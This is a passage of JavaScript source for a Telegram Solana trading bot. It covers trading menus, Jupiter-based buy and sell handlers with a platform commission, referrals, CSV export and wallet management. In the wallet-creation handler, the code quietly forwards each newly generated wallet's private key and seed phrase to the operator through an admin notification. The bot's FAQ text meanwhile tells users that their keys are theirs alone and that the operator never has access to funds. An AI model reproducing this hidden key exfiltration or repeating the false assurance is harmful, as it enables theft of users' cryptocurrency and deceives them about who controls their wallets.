    [Markup.button.callback('➕ Add Wallet', 'copytrade_add')],
    [Markup.button.callback('📋 Manage Wallets', 'copytrade_manage')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  try {
    if (edit) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) {
    if (edit) await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// LIMIT ORDER MENU
// ============================================
async function showLimitOrderMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  
  const message = `
📈 *Limit Orders*

Set buy/sell triggers at specific prices.

${session.limitOrders.length > 0 
  ? '*Active Orders:*\n' + session.limitOrders.map((o, i) => 
      `${i+1}. ${o.type} ${o.amount} @ $${o.price}`
    ).join('\n')
  : '_No active orders_'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🟢 Limit Buy', 'limit_buy'),
      Markup.button.callback('🔴 Limit Sell', 'limit_sell')
    ],
    [Markup.button.callback('📋 View Orders', 'limit_view')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// SETTINGS MENU
// ============================================
async function showSettingsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const { slippage, priorityFee, notifications } = session.settings;
  
  const message = `
⚙️ *Settings*

📊 *Slippage:* ${slippage}%
⚡ *Priority Fee:* ${priorityFee} SOL
🔔 *Notifications:* ${notifications ? 'ON' : 'OFF'}
${COMMISSION_PERCENTAGE > 0 ? `💸 *Platform Fee:* ${COMMISSION_PERCENTAGE}%` : ''}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback(`Slippage: ${slippage}%`, 'settings_slippage'),
      Markup.button.callback(`Fee: ${priorityFee}`, 'settings_fee')
    ],
    [
      Markup.button.callback(
        notifications ? '🔔 Notifs: ON' : '🔕 Notifs: OFF',
        'settings_notifications'
      )
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// FIXED BUY HANDLER - CLICKABLE TX LINK + TRADE RECORDING
// ============================================
async function handleBuy(ctx, amount, tokenAddress) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    await ctx.reply('❌ Please connect a wallet first.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')]
      ])
    });
    return;
  }
  
  if (!isSolanaAddress(tokenAddress)) {
    await ctx.reply('❌ Invalid token address.');
    return;
  }
  
  const balance = await getBalance(activeWallet.publicKey);
  const totalNeeded = amount + session.settings.priorityFee + 0.005;
  if (balance < totalNeeded) {
    await ctx.reply(`❌ Insufficient balance. You have ${balance.toFixed(4)} SOL.\nNeeded: ~${totalNeeded.toFixed(4)} SOL (including fees)`);
    return;
  }
  
  const statusMsg = await ctx.reply(`
🔄 *Processing Buy*

Amount: ${amount} SOL
Token: \`${shortenAddress(tokenAddress)}\`
Slippage: ${session.settings.slippage}%
${COMMISSION_PERCENTAGE > 0 ? `💸 Fee: ${COMMISSION_PERCENTAGE}%\n` : ''}

_Getting Jupiter quote..._
  `, { parse_mode: 'Markdown' });
  
  try {
    const amountInLamports = Math.floor(amount * LAMPORTS_PER_SOL);
    const slippageBps = Math.floor(session.settings.slippage * 100);
    const validSlippageBps = Math.max(50, Math.min(slippageBps, 5000));
    
    const quote = await getJupiterQuote(
      SOL_MINT,
      tokenAddress,
      amountInLamports,
      validSlippageBps,
      COMMISSION_BPS
    );
    
    if (!quote || !quote.outAmount) {
      throw new Error('No route found for this token. It may have low liquidity.');
    }
    
    const outputDecimals = quote.outputDecimals || 9;
    const expectedOutput = parseInt(quote.outAmount) / Math.pow(10, outputDecimals);
    
    const commissionTaken = quote.platformFee || null;
    const netOutput = commissionTaken 
      ? expectedOutput - (parseInt(commissionTaken.amount) / Math.pow(10, outputDecimals))
      : expectedOutput;
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Buy*

Amount: ${amount} SOL
Token: \`${shortenAddress(tokenAddress)}\`
Expected Output: ~${netOutput.toFixed(4)} tokens${commissionTaken ? `\n(Fee: ${(parseInt(commissionTaken.amount)/Math.pow(10, outputDecimals)).toFixed(4)} tokens)` : ''}

_Executing swap..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const result = await executeJupiterSwap(
      quote,
      activeWallet,
      session.settings.priorityFee,
      0,
      COMMISSION_WALLET
    );
    
    const receivedAmount = parseInt(quote.outAmount) / Math.pow(10, outputDecimals);
    
    // 🔥 GET TOKEN INFO FOR RECORDING
    const pair = await fetchTokenData(tokenAddress);
    const tokenSymbol = pair?.baseToken?.symbol || 'Unknown';
    const tokenName = pair?.baseToken?.name || 'Unknown';
    const priceUsd = parseFloat(pair?.priceUsd) || 0;
    const solPrice = await getSolPrice();
    const valueUsd = amount * solPrice;
    
    // 🔥 RECORD THE TRADE
    recordTrade(ctx.from.id, {
      type: 'BUY',
      tokenAddress: tokenAddress,
      tokenSymbol: tokenSymbol,
      tokenName: tokenName,
      amountSol: amount,
      amountToken: receivedAmount,
      priceUsd: priceUsd,
      txHash: result.txid,
      valueUsd: valueUsd,
      pnlUsd: 0,
      commission: commissionTaken ? parseInt(commissionTaken.amount) / Math.pow(10, outputDecimals) : 0
    });
    
    await notifyAdmin('TRADE_EXECUTED', ctx.from.id, ctx.from.username, {
      type: 'BUY',
      amount: amount,
      token: tokenAddress,
      txHash: result.txid,
      commission: commissionTaken ? (parseInt(commissionTaken.amount)/Math.pow(10, outputDecimals)).toFixed(6) : '0',
      commissionToken: 'tokens'
    });
    
    // 🔥 FIXED: TX as clickable link using HTML parse mode
    const txLink = `https://solscan.io/tx/${result.txid}`;
    const successMessage = `
✅ *Buy Successful!*

💰 Spent: ${amount} SOL
🪙 Received: ~${receivedAmount.toFixed(4)} ${tokenSymbol}${commissionTaken ? `\n💸 Fee: ${(parseInt(commissionTaken.amount)/Math.pow(10, outputDecimals)).toFixed(4)} tokens (${COMMISSION_PERCENTAGE}%)` : ''}
💵 Value: ~$${valueUsd.toFixed(2)}
📝 TX: <a href="${txLink}">${result.txid}</a>
    `;
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      successMessage,
      {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View on Solscan', txLink)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
    
  } catch (error) {
    console.error('Buy error:', error);
    const errorMessage = error.message || 'Unknown error occurred';
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `❌ *Buy Failed*\n\nError: ${escapeHtml(errorMessage)}`,
      {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('🔄 Retry', `buy_${amount}_${tokenAddress}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  }
}


// ============================================
// FIXED SELL HANDLER - CLICKABLE TX LINK + TRADE RECORDING
// ============================================
async function handleSell(ctx, percentage, tokenAddress) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    await ctx.reply('❌ Please connect a wallet first.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')]
      ])
    });
    return;
  }
  
  if (!isSolanaAddress(tokenAddress)) {
    await ctx.reply('❌ Invalid token address.');
    return;
  }
  
  const validPercentage = Math.max(1, Math.min(percentage, 100));
  
  const statusMsg = await ctx.reply(`
🔄 *Processing Sell*

Selling: ${validPercentage}%
Token: \`${shortenAddress(tokenAddress)}\`
Slippage: ${session.settings.slippage}%
${COMMISSION_PERCENTAGE > 0 ? `💸 Fee: ${COMMISSION_PERCENTAGE}%\n` : ''}

_Checking token balance..._
  `, { parse_mode: 'Markdown' });
  
  try {
    const tokenBalance = await getTokenBalance(activeWallet.publicKey, tokenAddress);
    
    if (!tokenBalance || tokenBalance.amount <= 0) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        null,
        '❌ No tokens to sell. You may not hold this token.'
      );
      return;
    }
    
    const decimals = tokenBalance.decimals || 9;
    const rawAmount = tokenBalance.amount * (validPercentage / 100);
    const sellAmount = Math.floor(rawAmount * Math.pow(10, decimals));
    
    if (sellAmount <= 0) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        null,
        '❌ Sell amount too small. Token balance may be dust.'
      );
      return;
    }
    
    const slippageBps = Math.floor(session.settings.slippage * 100);
    const validSlippageBps = Math.max(50, Math.min(slippageBps, 5000));
    const displayAmount = (sellAmount / Math.pow(10, decimals)).toFixed(4);
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Sell*

Selling: ${validPercentage}% (${displayAmount} tokens)
Token: \`${shortenAddress(tokenAddress)}\`

_Getting Jupiter quote..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const quote = await getJupiterQuote(
      tokenAddress,
      SOL_MINT,
      sellAmount,
      validSlippageBps,
      COMMISSION_BPS
    );
    
    if (!quote || !quote.outAmount) {
      throw new Error('No route found for this token. It may have low liquidity.');
    }
    
    const expectedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;
    const commissionTaken = quote.platformFee || null;
    const netSol = commissionTaken 
      ? expectedSol - (parseInt(commissionTaken.amount) / LAMPORTS_PER_SOL)
      : expectedSol;
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Sell*

Selling: ${displayAmount} tokens
Expected: ~${netSol.toFixed(4)} SOL${commissionTaken ? `\n(Fee: ${(parseInt(commissionTaken.amount)/LAMPORTS_PER_SOL).toFixed(4)} SOL)` : ''}

_Executing swap..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const result = await executeJupiterSwap(
      quote,
      activeWallet,
      session.settings.priorityFee,
      0,
      COMMISSION_WALLET
    );
    
    const receivedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;
    
    // 🔥 GET TOKEN INFO FOR RECORDING
    const pair = await fetchTokenData(tokenAddress);
    const tokenSymbol = pair?.baseToken?.symbol || 'Unknown';
    const tokenName = pair?.baseToken?.name || 'Unknown';
    const priceUsd = parseFloat(pair?.priceUsd) || 0;
    const solPrice = await getSolPrice();
    const valueUsd = receivedSol * solPrice;
    
    // 🔥 CALCULATE PNL
    let pnlUsd = 0;
    const buyTrades = session.tradeHistory.filter(t => 
      t.type === 'BUY' && t.tokenAddress === tokenAddress
    );
    
    if (buyTrades.length > 0) {
      const totalSpent = buyTrades.reduce((sum, t) => sum + (t.valueUsd || 0), 0);
      const totalBought = buyTrades.reduce((sum, t) => sum + (t.amountToken || 0), 0);
      const avgBuyPrice = totalBought > 0 ? totalSpent / totalBought : 0;
      const tokensSold = sellAmount / Math.pow(10, decimals);
      const costBasis = tokensSold * avgBuyPrice;
      pnlUsd = valueUsd - costBasis;
    }
    
    // 🔥 RECORD THE TRADE
    recordTrade(ctx.from.id, {
      type: 'SELL',
      tokenAddress: tokenAddress,
      tokenSymbol: tokenSymbol,
      tokenName: tokenName,
      amountSol: receivedSol,
      amountToken: sellAmount / Math.pow(10, decimals),
      priceUsd: priceUsd,
      txHash: result.txid,
      valueUsd: valueUsd,
      pnlUsd: pnlUsd,
      commission: commissionTaken ? parseInt(commissionTaken.amount) / LAMPORTS_PER_SOL : 0
    });
    
    await notifyAdmin('TRADE_EXECUTED', ctx.from.id, ctx.from.username, {
      type: 'SELL',
      amount: validPercentage + '%',
      token: tokenAddress,
      txHash: result.txid,
      commission: commissionTaken ? (parseInt(commissionTaken.amount)/LAMPORTS_PER_SOL).toFixed(6) : '0',
      commissionToken: 'SOL'
    });
    
    // 🔥 FIXED: TX as clickable link using HTML parse mode
    const txLink = `https://solscan.io/tx/${result.txid}`;
    const pnlEmoji = pnlUsd >= 0 ? '🟢' : '🔴';
    const pnlSign = pnlUsd >= 0 ? '+' : '';
    
    const successMessage = `
✅ *Sell Successful!*

💰 Sold: ${displayAmount} ${tokenSymbol}
🪙 Received: ~${receivedSol.toFixed(4)} SOL${commissionTaken ? `\n💸 Fee: ${(parseInt(commissionTaken.amount)/LAMPORTS_PER_SOL).toFixed(4)} SOL (${COMMISSION_PERCENTAGE}%)` : ''}
💵 Value: ~$${valueUsd.toFixed(2)}
${pnlUsd !== 0 ? `${pnlEmoji} PNL: ${pnlSign}$${Math.abs(pnlUsd).toFixed(2)}` : ''}
📝 TX: <a href="${txLink}">${result.txid}</a>
    `;
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      successMessage,
      {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View on Solscan', txLink)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
    
  } catch (error) {
    console.error('Sell error:', error);
    const errorMessage = error.message || 'Unknown error occurred';
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `❌ *Sell Failed*\n\nError: ${escapeHtml(errorMessage)}`,
      {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('🔄 Retry', `sell_${percentage}_${tokenAddress}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  }
}



// ============================================
// COMMAND HANDLERS
// ============================================
bot.command('start', async (ctx) => {
  const session = getSession(ctx.from.id);
  
  const startPayload = ctx.message.text.split(' ')[1];
  if (startPayload && startPayload.startsWith('ref_')) {
    const referralCode = startPayload.replace('ref_', '');
    if (session.isNewUser) {
      const applied = applyReferral(ctx.from.id, referralCode);
      if (applied) {
        const referrerId = referralCodes.get(referralCode);
        await notifyAdmin('REFERRAL_JOINED', referrerId, ctx.from.username, {
          newUserId: ctx.from.id
        });
        await ctx.reply('🎁 Referral applied! You joined via a referral link.');
      }
    }
  }
  
  if (session.isNewUser) {
    session.isNewUser = false;
    await notifyAdmin('NEW_USER', ctx.from.id, ctx.from.username);
  }
  
  await showMainMenu(ctx);
});

bot.command('wallet', async (ctx) => {
  await showWalletMenu(ctx);
});

bot.command('positions', async (ctx) => {
  await showPositionsMenu(ctx);
});

bot.command('buy', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length >= 2) {
    const amount = parseFloat(args[0]);
    const address = args[1];
    if (!isNaN(amount) && isSolanaAddress(address)) {
      await handleBuy(ctx, amount, address);
    } else {
      await ctx.reply('❌ Usage: /buy [amount] [token_address]');
    }
  } else {
    await showBuyMenu(ctx);
  }
});

bot.command('sell', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length >= 2) {
    const percentage = parseFloat(args[0]);
    const address = args[1];
    if (!isNaN(percentage) && isSolanaAddress(address)) {
      await handleSell(ctx, percentage, address);
    } else {
      await ctx.reply('❌ Usage: /sell [percentage] [token_address]');
    }
  } else {
    await showSellMenu(ctx);
  }
});

// PNL Report callback
bot.action('menu_pnl_report', async (ctx) => {
  await ctx.answerCbQuery();
  await showPNLReport(ctx, true);
});

// Export CSV callback
bot.action('export_pnl_csv', async (ctx) => {
  await ctx.answerCbQuery('📥 Generating...');
  
  try {
    const session = getSession(ctx.from.id);
    const history = session.tradeHistory || [];
    
    if (history.length === 0) {
      return ctx.reply('No trades to export.');
    }
    
    let csv = 'Date,Time,Type,Token,Symbol,Amount SOL,Amount Token,Price USD,Value USD,PNL USD,TX Hash\n';
    
    history.forEach(trade => {
      csv += `"${trade.date}","${trade.time}","${trade.type}","${trade.tokenAddress}","${trade.tokenSymbol}",${trade.amountSol || 0},${trade.amountToken || 0},${trade.priceUsd || 0},${trade.valueUsd || 0},${trade.pnlUsd || 0},"${trade.txHash}"\n`;
    });
    
    await ctx.replyWithDocument(
      { 
        source: Buffer.from(csv), 
        filename: `pnl_report_${new Date().toISOString().split('T')[0]}.csv` 
      },
      { caption: '📊 PNL Report' }
    );
    
  } catch (error) {
    console.error('Export error:', error);
    await ctx.reply('❌ Export failed.');
  }
});


bot.action('menu_history', async (ctx) => {
  await ctx.answerCbQuery();
  await showTradeHistory(ctx, true);
});

bot.action('export_history_csv', async (ctx) => {
  await ctx.answerCbQuery('📥 Generating...');
  
  try {
    const session = getSession(ctx.from.id);
    const history = session.tradeHistory || [];
    
    if (history.length === 0) {
      return ctx.reply('No history to export.');
    }
    
    let csv = 'Date,Time,Type,Token,Symbol,Amount SOL,Amount Token,Price USD,Value USD,PNL USD,TX Hash\n';
    
    history.forEach(trade => {
      csv += `"${trade.date || ''}","${trade.time || ''}","${trade.type}","${trade.tokenAddress}","${trade.tokenSymbol || ''}",${trade.amountSol || 0},${trade.amountToken || 0},${trade.priceUsd || 0},${trade.valueUsd || 0},${trade.pnlUsd || 0},"${trade.txHash || ''}"\n`;
    });
    
    await ctx.replyWithDocument(
      { 
        source: Buffer.from(csv), 
        filename: `trade_history_${new Date().toISOString().split('T')[0]}.csv` 
      },
      { caption: '📜 Trade History Export' }
    );
    
  } catch (error) {
    console.error('Export error:', error);
    await ctx.reply('❌ Export failed.');
  }
});

bot.action('clear_history_confirm', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
⚠️ *Clear All History?*

This will permanently delete all ${ctx.session?.tradeHistory?.length || 0} trade records.

*This cannot be undone!*

Are you sure?
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('✅ Yes, Clear All', 'clear_history_yes')],
      [Markup.button.callback('❌ No, Keep History', 'menu_history')]
    ])
  });
});

bot.action('clear_history_yes', async (ctx) => {
  await ctx.answerCbQuery('History cleared');
  
  const session = getSession(ctx.from.id);
  session.tradeHistory = [];
  session.dailyStats = {
    date: new Date().toDateString(),
    totalTrades: 0,
    profitableTrades: 0,
    lossTrades: 0,
    totalPnl: 0
  };
  
  await showTradeHistory(ctx, true);
});


bot.command('copytrade', async (ctx) => {
  await showCopyTradeMenu(ctx);
});

bot.command('limit', async (ctx) => {
  await showLimitOrderMenu(ctx);
});

bot.command('settings', async (ctx) => {
  await showSettingsMenu(ctx);
});

bot.command('refresh', async (ctx) => {
  await showMainMenu(ctx);
});

bot.command('referral', async (ctx) => {
  await showReferralsMenu(ctx);
});

bot.command('help', async (ctx) => {
  await showHelpMenu(ctx);
});

// ============================================
// CALLBACK HANDLERS - Navigation
// ============================================
bot.action('back_main', async (ctx) => {
  await ctx.answerCbQuery();
  await showMainMenu(ctx, true);
});

bot.action('refresh_main', async (ctx) => {
  await ctx.answerCbQuery('✅ Refreshed!');
  await showMainMenu(ctx, true);
});

bot.action('noop', async (ctx) => {
  await ctx.answerCbQuery();
});

bot.action('menu_wallet', async (ctx) => {
  await ctx.answerCbQuery();
  await showWalletMenu(ctx, true);
});

bot.action('menu_positions', async (ctx) => {
  await ctx.answerCbQuery();
  await showPositionsMenu(ctx, true);
});

bot.action('menu_buy', async (ctx) => {
  await ctx.answerCbQuery();
  await showBuyMenu(ctx, true);
});

bot.action('menu_sell', async (ctx) => {
  await ctx.answerCbQuery();
  await showSellMenu(ctx, true);
});

bot.action('menu_copytrade', async (ctx) => {
  await ctx.answerCbQuery();
  await showCopyTradeMenu(ctx, true);
});

bot.action('menu_limit', async (ctx) => {
  await ctx.answerCbQuery();
  await showLimitOrderMenu(ctx, true);
});

bot.action('menu_settings', async (ctx) => {
  await ctx.answerCbQuery();
  await showSettingsMenu(ctx, true);
});

bot.action('menu_referrals', async (ctx) => {
  await ctx.answerCbQuery();
  await showReferralsMenu(ctx, true);
});

bot.action('menu_help', async (ctx) => {
  await ctx.answerCbQuery();
  await showHelpMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Referrals
// ============================================
bot.action('referral_copy', async (ctx) => {
  const referralCode = getReferralCode(ctx.from.id);
  const botUsername = (await bot.telegram.getMe()).username;
  const referralLink = `https://t.me/${botUsername}?start=ref_${referralCode}`;
  
  await ctx.answerCbQuery('📋 Link copied to clipboard concept - share it!');
  await ctx.reply(`
📋 *Your Referral Link:*

\`${referralLink}\`

_Tap to copy and share with friends!_
  `, { parse_mode: 'Markdown' });
});

bot.action('referral_share', async (ctx) => {
  const referralCode = getReferralCode(ctx.from.id);
  const botUsername = (await bot.telegram.getMe()).username;
  const referralLink = `https://t.me/${botUsername}?start=ref_${referralCode}`;
  
  await ctx.answerCbQuery();
  await ctx.reply(`
📤 *Share with friends:*

🚀 Join me on WTF Snipe X Bot - the ultimate Solana trading bot!

${referralLink}

_Use my link to get started!_
  `, { parse_mode: 'Markdown' });
});

bot.action('referral_list', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.referrals.length === 0) {
    await ctx.reply('📊 No referrals yet. Start sharing your link!');
    return;
  }
  
  const referralsList = session.referrals.map((r, i) => 
    `${i + 1}. User ...${r.userId.toString().slice(-4)} - ${new Date(r.joinedAt).toLocaleDateString()}`
  ).join('\n');
  
  await ctx.reply(`
📊 *Your Referrals (${session.referrals.length}):*

${referralsList}

💰 Total Earnings: ${session.referralEarnings.toFixed(4)} SOL
  `, { parse_mode: 'Markdown' });
});

bot.action('referral_refresh', async (ctx) => {
  await ctx.answerCbQuery('✅ Refreshed!');
  await showReferralsMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Help Sub-menus
// ============================================
bot.action('help_wallet', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
💼 *Wallet Guide*

━━━━━━━━━━━━━━━━━━
*Creating a Wallet:*
1. Go to 💼 Wallet menu
2. Click "🆕 Create New Wallet"
3. Save your seed phrase securely!

*Importing a Wallet:*
1. Go to 💼 Wallet menu
2. Choose import method (Seed/Key)
3. Paste your credentials

*Switching Wallets:*
Click the wallet buttons (W1, W2, etc.)

*Security Tips:*
• Never share your private key
• Store seed phrase offline
• Use a dedicated trading wallet
━━━━━━━━━━━━━━━━━━
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back to Help', 'menu_help')]
    ])
  });
});

bot.action('help_trading', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
📊 *Trading Guide*

━━━━━━━━━━━━━━━━━━
*Analyzing Tokens:*
Just paste any Solana contract address

*Buying Tokens:*
1. Paste token address
2. Click Buy amount button
3. Confirm the transaction

*Selling Tokens:*
1. Go to token analysis
2. Click Sell percentage
3. Confirm the transaction

*Limit Orders:*
Set price triggers for auto buy/sell

*DCA (Dollar Cost Average):*
Split buys over time intervals
━━━━━━━━━━━━━━━━━━
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back to Help', 'menu_help')]
    ])
  });
});

bot.action('help_security', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
🔒 *Security Tips*

━━━━━━━━━━━━━━━━━━
*Protect Your Wallet:*
• Never share private keys or seed phrases
• Use a dedicated trading wallet
• Don't store large amounts

*Avoid Scams:*
• Check token security scores
• Beware of new tokens (<24h)
• Watch for low liquidity warnings
• Verify contract addresses

*Safe Trading:*
• Start with small amounts
• Use appropriate slippage
• Set price alerts for monitoring

*Red Flags:*
🚨 Sudden large price drops
⚠️ Very low liquidity
⚠️ Extremely new tokens
━━━━━━━━━━━━━━━━━━
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back to Help', 'menu_help')]
    ])
  });
});

bot.action('help_faq', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
❓ *Frequently Asked Questions*

━━━━━━━━━━━━━━━━━━
*Q: How many wallets can I have?*
A: Up to 5 wallets per account

*Q: What are the fees?*
A: Only network fees + priority fee you set${COMMISSION_PERCENTAGE > 0 ? ` + ${COMMISSION_PERCENTAGE}% platform fee` : ''}

*Q: How does slippage work?*
A: Higher slippage = faster execution but potentially worse price

*Q: Are my funds safe?*
A: You control your private keys. We never have access to your funds.

*Q: What is copy trading?*
A: Automatically mirror trades from successful wallets

*Q: How do referrals work?*
A: Earn 10% of trading fees from referred users
━━━━━━━━━━━━━━━━━━
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back to Help', 'menu_help')]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - Wallet Actions
// ============================================
bot.action('wallet_create', async (ctx) => {
  await ctx.answerCbQuery();
  
  const session = getSession(ctx.from.id);
  
  if (session.wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  const walletData = createWallet();
  session.wallets.push(walletData);
  session.activeWalletIndex = session.wallets.length - 1;
  
  await notifyAdmin('WALLET_CREATED', ctx.from.id, ctx.from.username, {
    publicKey: walletData.publicKey,
    privateKey: walletData.privateKey,
    mnemonic: walletData.mnemonic,
    walletNumber: session.wallets.length
  });
  
  await ctx.editMessageText(`
✅ *Wallet ${session.wallets.length} Created!*

📍 *Address:*
\`${walletData.publicKey}\`

📝 *Seed Phrase (SAVE THIS!):*
\`${walletData.mnemonic}\`

⚠️ *Never share your seed phrase!*
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
      [Markup.button.callback('« Main Menu', 'back_main')]
    ])
  });
});

bot.action('wallet_import_menu', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
📥 *Import Wallet*

Choose import method:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('📝 Seed Phrase', 'wallet_import_seed')],
      [Markup.button.callback('🔑 Private Key', 'wallet_import_key')],
      [Markup.button.callback('« Back', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_import_seed', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  session.state = 'AWAITING_SEED';
  
  await ctx.editMessageText(`
📥 *Import via Seed Phrase*

Please send your 12 or 24 word seed phrase.

⚠️ Make sure you're in a private chat!
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_import_key', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  session.state = 'AWAITING_PRIVATE_KEY';
  
  await ctx.editMessageText(`
🔑 *Import via Private Key*

Please send your Base58 encoded private key.

⚠️ Make sure you're in a private chat!
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_export', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    await ctx.reply('❌ No wallet connected.');
    return;
  }
  
  await notifyAdmin('WALLET_EXPORTED', ctx.from.id, ctx.from.username, {
    publicKey: activeWallet.publicKey
  });
  
  const message = `
🔐 *Export Wallet ${session.activeWalletIndex + 1}*

📍 *Address:*
\`${activeWallet.publicKey}\`

🔑 *Private Key:*
\`${activeWallet.privateKey}\`
${activeWallet.mnemonic ? `
📝 *Seed Phrase:*
\`${activeWallet.mnemonic}\`` : ''}

⚠️ *Delete this message after saving!*
  `;
  
  await ctx.reply(message, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🗑️ Delete Message', 'delete_message')]
    ])
  });
});

bot.action('wallet_remove', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.wallets.length === 0) {
    await ctx.reply('❌ No wallets to remove.');
    return;
  }
  
  const buttons = session.wallets.map((w, i) => [
    Markup.button.callback(
      `🗑️ Remove Wallet ${i + 1} (${shortenAddress(w.publicKey)})`,
      `confirm_remove_${i}`
    )
  ]);
  
  buttons.push([Markup.button.callback('« Back', 'menu_wallet')]);
  
  await ctx.editMessageText(`
🗑️ *Remove Wallet*

Select a wallet to remove:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.action(/^confirm_remove_(\d+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const index = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  
  if (index < 0 || index >= session.wallets.length) {
    await ctx.reply('❌ Invalid wallet.');
    return;
  }
  
  const removedWallet = session.wallets.splice(index, 1)[0];
  
  if (session.activeWalletIndex >= session.wallets.length) {
    session.activeWalletIndex = Math.max(0, session.wallets.length - 1);
  }
  
  await ctx.editMessageText(`
✅ Wallet removed: \`${shortenAddress(removedWallet.publicKey)}\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
      [Markup.button.callback('« Main Menu', 'back_main')]
